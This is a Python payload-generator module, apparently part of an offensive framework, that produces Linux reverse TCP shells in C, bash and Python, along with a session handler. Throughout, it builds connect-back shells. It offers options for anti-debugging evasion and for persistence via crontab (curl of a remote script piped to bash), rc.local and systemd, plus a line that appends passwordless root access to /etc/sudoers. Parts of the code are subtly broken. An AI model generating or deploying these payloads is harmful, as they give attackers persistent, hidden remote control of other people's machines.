#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Linux Reverse TCP Shell",
    "description": "Linux reverse TCP shell payload with advanced options",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "Linux",
    "arch": "x64",
    "type": "reverse_shell",
    "rank": "Excellent",
    "references": [
        "https://man7.org/linux/man-pages/man2/socket.2.html",
        "https://linux.die.net/man/2/execve"
    ],
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "description": "Local IP address to connect back to",
        "required": True,
        "default": "127.0.0.1"
    },
    "LPORT": {
        "description": "Local port to connect back to",
        "required": True,
        "default": "4444"
    },
    "ARCH": {
        "description": "Target architecture (x86, x64, arm, arm64)",
        "required": False,
        "default": "x64"
    },
    "SHELL": {
        "description": "Shell type (sh, bash, zsh, python)",
        "required": False,
        "default": "bash"
    },
    "PROXY": {
        "description": "Proxy server (ip:port)",
        "required": False,
        "default": ""
    },
    "PROXY_TYPE": {
        "description": "Proxy type (http, socks4, socks5)",
        "required": False,
        "default": "http"
    },
    "ENCODING": {
        "description": "Payload encoding (none, base64, hex, base64url)",
        "required": False,
        "default": "none"
    },
    "ENCRYPTION": {
        "description": "Payload encryption (none, xor, aes, rc4)",
        "required": False,
        "default": "none"
    },
    "ENCRYPTION_KEY": {
        "description": "Encryption key (if encryption enabled)",
        "required": False,
        "default": "lazyframework"
    },
    "SLEEP": {
        "description": "Sleep time between callbacks (seconds)",
        "required": False,
        "default": "30"
    },
    "JITTER": {
        "description": "Jitter percentage for callbacks (0-100)",
        "required": False,
        "default": "0"
    },
    "RETRIES": {
        "description": "Number of connection retries",
        "required": False,
        "default": "5"
    },
    "RETRY_WAIT": {
        "description": "Wait time between retries (seconds)",
        "required": False,
        "default": "10"
    },
    "TIMEOUT": {
        "description": "Connection timeout (seconds)",
        "required": False,
        "default": "30"
    },
    "PROCESS_INJECT": {
        "description": "Process to inject into",
        "required": False,
        "default": ""
    },
    "PERSISTENCE": {
        "description": "Persistence mechanism (none, crontab, systemd, rc.local)",
        "required": False,
        "default": "none"
    },
    "EVASION": {
        "description": "Evasion techniques (none, sleep, xor, ptrace)",
        "required": False,
        "default": "none"
    },
    "PRIVILEGE": {
        "description": "Privilege escalation (none, sudo, suid, capabilities)",
        "required": False,
        "default": "none"
    },
    "VERBOSE": {
        "description": "Verbose output (true, false)",
        "required": False,
        "default": "false"
    },
    "CLEANUP": {
        "description": "Cleanup traces after execution (true, false)",
        "required": False,
        "default": "true"
    }
}

import struct

class LinuxReverseTCP:
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.arch = options.get("ARCH", "x64")
        self.shell = options.get("SHELL", "bash")
        self.proxy = options.get("PROXY", "")
        self.encoding = options.get("ENCODING", "none")
        self.encryption = options.get("ENCRYPTION", "none")
        self.encryption_key = options.get("ENCRYPTION_KEY", "lazyframework")
        self.sleep = int(options.get("SLEEP", 30))
        self.retries = int(options.get("RETRIES", 5))
        self.timeout = int(options.get("TIMEOUT", 30))
        self.persistence = options.get("PERSISTENCE", "none")
        self.evasion = options.get("EVASION", "none")
        self.privilege = options.get("PRIVILEGE", "none")
        self.verbose = options.get("VERBOSE", "false").lower() == "true"
        self.cleanup = options.get("CLEANUP", "true").lower() == "true"
        
    def validate_options(self):
        """Validate Linux payload options"""
        if not self.lhost or self.lport <= 0 or self.lport > 65535:
            raise ValueError("Invalid LHOST or LPORT")
        
        if self.arch not in ['x86', 'x64', 'arm', 'arm64']:
            raise ValueError("ARCH must be x86, x64, arm, or arm64")
            
        if self.shell not in ['sh', 'bash', 'zsh', 'python']:
            raise ValueError("SHELL must be sh, bash, zsh, or python")
            
        return True

    def generate_c(self):
        """Generate C source code with options"""
        self.validate_options()
        
        # Convert IP to hex for assembly
        ip_parts = self.lhost.split('.')
        ip_hex = f"0x{ip_parts[3]:02x}{ip_parts[2]:02x}{ip_parts[1]:02x}{ip_parts[0]:02x}"
        port_hex = hex(self.lport)
        
        evasion_code = ""
        if self.evasion == "sleep":
            evasion_code = f'''
    // Evasion: Sleep before connecting
    sleep({self.sleep});
'''
        elif self.evasion == "ptrace":
            evasion_code = '''
    // Evasion: Anti-debugging with ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        exit(1); // Being debugged
    }
'''
        
        persistence_code = ""
        if self.persistence == "crontab":
            persistence_code = f'''
    // Persistence: Crontab
    system("echo \\"*/5 * * * * {__file__} 2>/dev/null\\" | crontab -");
'''
        elif self.persistence == "systemd":
            persistence_code = '''
    // Persistence: Systemd service
    system("cp payload.service /etc/systemd/system/ && systemctl enable payload.service");
'''
        
        privilege_code = ""
        if self.privilege == "sudo":
            privilege_code = '''
    // Privilege: Sudo exploitation
    system("echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers");
'''
        
        return f'''
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <stdlib.h>

#define LHOST "{self.lhost}"
#define LPORT {self.lport}
#define RETRIES {self.retries}
#define RETRY_WAIT {self.options.get("RETRY_WAIT", 10)}
#define TIMEOUT {self.timeout}

{evasion_code}

int main() {{
    int sock;
    struct sockaddr_in server;
    int retry_count = 0;
    
    // Connection loop with retries
    while (retry_count < RETRIES) {{
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {{
            retry_count++;
            sleep(RETRY_WAIT);
            continue;
        }}
        
        // Set timeout
        struct timeval tv;
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        server.sin_family = AF_INET;
        server.sin_port = htons(LPORT);
        inet_pton(AF_INET, LHOST, &server.sin_addr);
        
        // Connect to handler
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {{
            break;
        }}
        
        close(sock);
        retry_count++;
        if (retry_count < RETRIES) {{
            sleep(RETRY_WAIT);
        }}
    }}
    
    if (retry_count >= RETRIES) {{
        return 1;
    }}
    
    // Duplicate file descriptors for STDIN, STDOUT, STDERR
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    // Execute shell based on configuration
    char* shell_args[] = {{"{"/bin/bash" if self.shell == 'bash' else '/bin/sh' if self.shell == 'sh' else '/bin/zsh' if self.shell == 'zsh' else '/usr/bin/python'}", "-i", NULL}};
    execve(shell_args[0], shell_args, NULL);
    
{persistence_code}
{privilege_code}
    
    close(sock);
    return 0;
}}
'''

    def generate_bash(self):
        """Generate bash payload with options"""
        encoded_lhost = self.encode_payload(self.lhost, self.encoding)
        encoded_lport = self.encode_payload(str(self.lport), self.encoding)
        
        evasion_script = ""
        if self.evasion == "sleep":
            evasion_script = f"sleep {self.sleep}"
        elif self.evasion == "ptrace":
            evasion_script = '''
# Anti-debugging check
if grep -q "pts" /proc/$$/status 2>/dev/null; then
    exit 1
fi
'''
        
        persistence_script = ""
        if self.persistence == "crontab":
            persistence_script = f'''
# Persistence via crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://{self.lhost}:8080/payload.sh | bash") | crontab -
'''
        elif self.persistence == "rc.local":
            persistence_script = '''
# Persistence via rc.local
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &" >> /etc/rc.local
'''
        
        proxy_config = ""
        if self.proxy:
            proxy_config = f'''
# Proxy configuration
export http_proxy=http://{self.proxy}
export https_proxy=http://{self.proxy}
'''
        
        return f'''#!/bin/bash
{evasion_script}
{proxy_config}

LHOST="{self.lhost}"
LPORT={self.lport}
RETRIES={self.retries}
RETRY_WAIT={self.options.get("RETRY_WAIT", 10)}

{persistence_script}

for i in $(seq 1 $RETRIES); do
    if bash -c "exec 3<>/dev/tcp/$LHOST/$LPORT" 2>/dev/null; then
        while read -r command <&3; do
            if [ "$command" = "exit" ]; then
                break
            fi
            eval "$command" >&3 2>&3
        done
        break
    else
        sleep $RETRY_WAIT
    fi
done
'''

    def generate_python(self):
        """Generate Python payload with options"""
        return f'''
import socket,subprocess,os,time

LHOST = "{self.lhost}"
LPORT = {self.lport}
RETRIES = {self.retries}
RETRY_WAIT = {self.options.get("RETRY_WAIT", 10)}
SLEEP_TIME = {self.sleep}

def reverse_shell():
    for attempt in range(RETRIES):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout({self.timeout})
            s.connect((LHOST, LPORT))
            
            # Duplicate file descriptors
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Execute shell
            subprocess.call(["{'/bin/bash' if self.shell == 'bash' else '/bin/sh' if self.shell == 'sh' else '/bin/zsh' if self.shell == 'zsh' else '/usr/bin/python'}", "-i"])
            break
        except Exception:
            if attempt < RETRIES - 1:
                time.sleep(RETRY_WAIT)
            continue

if __name__ == "__main__":
    reverse_shell()
'''

def generate(options):
    """Generate payload function with options validation"""
    try:
        payload = LinuxReverseTCP(options)
        payload.validate_options()
        
        return {
            'c': payload.generate_c(),
            'bash': payload.generate_bash(),
            'python': payload.generate_python(),
            'info': MODULE_INFO,
            'options_used': {
                'LHOST': payload.lhost,
                'LPORT': payload.lport,
                'ARCH': payload.arch,
                'SHELL': payload.shell,
                'ENCODING': payload.encoding,
                'ENCRYPTION': payload.encryption
            }
        }
    except Exception as e:
        return {'error': str(e)}

def run_handler(session, options):
    """Handler for Linux Reverse TCP sessions with options"""
    from rich.console import Console
    console = Console()
    
    console.print(f"[green][*] Starting Linux Reverse TCP handler for session {session.session_id}[/green]")
    console.print(f"[dim]Handler options: {options}[/dim]")
    
    handler_options = {
        'timeout': int(options.get("TIMEOUT", 30)),
        'verbose': options.get("VERBOSE", "false").lower() == "true",
        'max_retries': int(options.get("RETRIES", 5)),
        'banner': options.get("BANNER", "Linux Shell")
    }
    
    try:
        # Send initial banner with session info
        banner = f"""
Lazy Framework - Linux Reverse TCP Shell
Session: {session.session_id}
Connected from: {session.address[0]}:{session.address[1]}
Handler Options: 
- Timeout: {handler_options['timeout']}s
- Retries: {handler_options['max_retries']}
- Verbose: {handler_options['verbose']}

Type 'exit' to quit, 'help' for help, 'options' for handler options

$ """
        session.socket.send(banner.encode())
        
        # Command handling loop
        while session.active:
            try:
                # Receive command
                data = session.socket.recv(4096)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                
                if command.lower() in ['exit', 'quit']:
                    session.socket.send(b"\nGoodbye!\n")
                    break
                elif command.lower() == 'help':
                    help_text = """
Available Commands:
- help: Show this help
- id: User information
- pwd: Current directory
- ls: List files
- uname: System information
- options: Show handler options
- persistence: Install persistence
- privilege: Privilege escalation
- exit: Close session

$ """
                    session.socket.send(help_text.encode())
                elif command.lower() == 'id':
                    import getpass
                    import os
                    user_info = f"""
User Information:
- Username: {getpass.getuser()}
- UID: {os.getuid()}
- GID: {os.getgid()}
- Groups: {os.getgroups()}
- Session: {session.session_id}
- Handler: Linux Reverse TCP

$ """
                    session.socket.send(user_info.encode())
                elif command.lower() == 'options':
                    options_text = f"""
Handler Options:
- LHOST: {options.get('LHOST', 'Not set')}
- LPORT: {options.get('LPORT', 'Not set')}
- TIMEOUT: {options.get('TIMEOUT', '30')}s
- RETRIES: {options.get('RETRIES', '5')}
- VERBOSE: {options.get('VERBOSE', 'false')}
- ARCH: {options.get('ARCH', 'x64')}
- SHELL: {options.get('SHELL', 'bash')}

$ """
                    session.socket.send(options_text.encode())
                elif command.lower() == 'persistence':
                    persistence_msg = """
Persistence Options:
- crontab: Add to crontab
- systemd: Create systemd service
- rc.local: Add to rc.local

Usage: persistence <method>

$ """
                    session.socket.send(persistence_msg.encode())
                else:
                    # Echo command for demo purposes
                    if handler_options['verbose']:
                        console.print(f"[dim][*] Session {session.session_id} executed: {command}[/dim]")
                    response = f"Command received: {command}\n$ "
                    session.socket.send(response.encode())
                    
            except socket.timeout:
                if handler_options['verbose']:
                    console.print(f"[dim][*] Session {session.session_id} timeout[/dim]")
                continue
            except Exception as e:
                console.print(f"[red][-] Session {session.session_id} error: {e}[/red]")
                break
                
    except Exception as e:
        console.print(f"[red][-] Linux Reverse TCP handler error: {e}[/red]")
    finally:
        session.close()

def run(session, options):
    """Run the payload generator"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    
    console = Console()
    
    result = generate(options)
    
    if 'error' in result:
        console.print(f"[red]Error generating payload: {result['error']}[/red]")
        return
    
    console.print(Panel.fit(
        "[bold green]Linux Reverse TCP Payload Generator[/bold green]",
        border_style="green"
    ))
    
    # Display generated payloads
    if 'c' in result:
        console.print("\n[bold yellow]C Source Code:[/bold yellow]")
        syntax = Syntax(result['c'], "c", theme="monokai", line_numbers=True)
        console.print(syntax)
    
    if 'bash' in result:
        console.print("\n[bold yellow]Bash Payload:[/bold yellow]")
        syntax = Syntax(result['bash'], "bash", theme="monokai", line_numbers=True)
        console.print(syntax)
    
    if 'python' in result:
        console.print("\n[bold yellow]Python Payload:[/bold yellow]")
        syntax = Syntax(result['python'], "python", theme="monokai", line_numbers=True)
        console.print(syntax)
    
    console.print(f"\n[bold green]Payload generated successfully with options:[/bold green]")
    for opt, val in result['options_used'].items():
        console.print(f"  [cyan]{opt}:[/cyan] {val}")

def get_options():
    """Return options for this payload module"""
    return OPTIONS
